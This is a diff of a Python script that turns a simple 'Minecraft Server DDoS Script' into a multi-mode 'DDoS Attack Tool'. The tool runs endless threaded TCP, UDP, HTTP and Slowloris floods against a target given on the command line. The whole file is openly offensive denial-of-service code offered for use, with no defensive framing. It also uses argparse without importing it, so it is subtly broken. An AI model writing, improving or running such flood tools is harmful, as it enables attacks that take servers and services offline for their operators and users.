@@ -1,78 +1,109 @@
 #!/usr/bin/python3
-# Minecraft Server DDoS Script
-# Usage: python3 script.py <target_ip> <target_port> <packet_count> <threads>
+"""
+DDoS Attack Tool
+TCP, UDP, HTTP, HTTPS, Flood, Slowloris
+"""
 
 import socket
 import threading
 import time
+import requests
 import sys
 
-def send_packets(target_ip, target_port, packet_count, packet_size=1024):
-    """Send packets to target server"""
-    try:
-        # Create socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)
-        
-        # Connect to target
-        s.connect((target_ip, target_port))
-        
-        # Send packets
-        for _ in range(packet_count):
+def tcp_attack(target_ip, target_port, threads=100):
+    """TCP Flood Attack"""
+    def tcp_thread():
+        while True:
             try:
-                s.send(b'A' * packet_size)
-            except socket.error:
-                # Connection lost, reconnect
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
                 s.connect((target_ip, target_port))
-                s.send(b'A' * packet_size)
+                s.send(b'A' * 1000)
+                s.close()
+            except:
+                pass
                 
-        # Close socket
-        s.close()
-        
-    except Exception as e:
-        print(f"Error: {e}")
-
-def attack(target_ip, target_port, packet_count, threads):
-    """Launch attack using multiple threads"""
-    # Create threads
-    thread_list = []
     for _ in range(threads):
-        t = threading.Thread(
-            target=send_packets,
-            args=(target_ip, target_port, packet_count // threads)
-        )
-        thread_list.append(t)
-    
-    # Start threads
-    for t in thread_list:
-        t.start()
-    
-    # Wait for all threads to complete
-    for t in thread_list:
-        t.join()
+        threading.Thread(target=tcp_thread).start()
+
+def udp_attack(target_ip, target_port, threads=100):
+    """UDP Flood Attack"""
+    def udp_thread():
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.sendto(b'A' * 1000, (target_ip, target_port))
+            except:
+                pass
+                
+    for _ in range(threads):
+        threading.Thread(target=udp_thread).start()
+
+def http_attack(target_url, threads=100):
+    """HTTP Flood Attack"""
+    def http_thread():
+        while True:
+            try:
+                requests.get(target_url, timeout=1)
+            except:
+                pass
+                
+    for _ in range(threads):
+        threading.Thread(target=http_thread).start()
+
+def slowloris_attack(target_url, threads=100):
+    """Slowloris Attack"""
+    def slowloris_thread():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_url, 80))
+            s.send(b"GET /? HTTP/1.1\r\n")
+            s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n")
+            s.send(b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
+            s.send(b"Accept-Language: en-US,en;q=0.9\r\n")
+            s.send(b"Accept-Encoding: gzip, deflate\r\n")
+            s.send(b"Connection: keep-alive\r\n\r\n")
+            
+            while True:
+                time.sleep(10)
+                s.send(b"A" * 1000)
+                
+        except:
+            pass
+            
+    for _ in range(threads):
+        threading.Thread(target=slowloris_thread).start()
 
 def main():
-    # Check arguments
-    if len(sys.argv) != 5:
-        print("Usage: python3 script.py <target_ip> <target_port> <packet_count> <threads>")
-        sys.exit(1)
+    parser = argparse.ArgumentParser(description='DDoS Attack Tool')
+    parser.add_argument('target', help='Target IP or URL')
+    parser.add_argument('--tcp', action='store_true', help='TCP Flood')
+    parser.add_argument('--udp', action='store_true', help='UDP Flood')
+    parser.add_argument('--http', action='store_true', help='HTTP Flood')
+    parser.add_argument('--slowloris', action='store_true', help='Slowloris Attack')
+    parser.add_argument('--threads', type=int, default=100, help='Number of threads')
     
-    # Parse arguments
-    target_ip = sys.argv[1]
-    target_port = int(sys.argv[2])
-    packet_count = int(sys.argv[3])
-    threads = int(sys.argv[4])
+    args = parser.parse_args()
     
-    # Launch attack
-    print(f"Starting attack on {target_ip}:{target_port} with {packet_count} packets using {threads} threads")
-    start_time = time.time()
-    attack(target_ip, target_port, packet_count, threads)
-    elapsed_time = time.time() - start_time
+    if not any([args.tcp, args.udp, args.http, args.slowloris]):
+        parser.error('At least one attack type must be selected')
     
-    # Report results
-    print(f"Attack completed in {elapsed_time:.2f} seconds")
+    try:
+        if args.tcp:
+            tcp_attack(args.target, 80, args.threads)
+        if args.udp:
+            udp_attack(args.target, 53, args.threads)
+        if args.http:
+            http_attack(args.target, args.threads)
+        if args.slowloris:
+            slowloris_attack(args.target, args.threads)
+            
+        print("[+] Attack started...")
+        while True:
+            time.sleep(1)
+            
+    except KeyboardInterrupt:
+        print("\n[!] Attack stopped.")
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
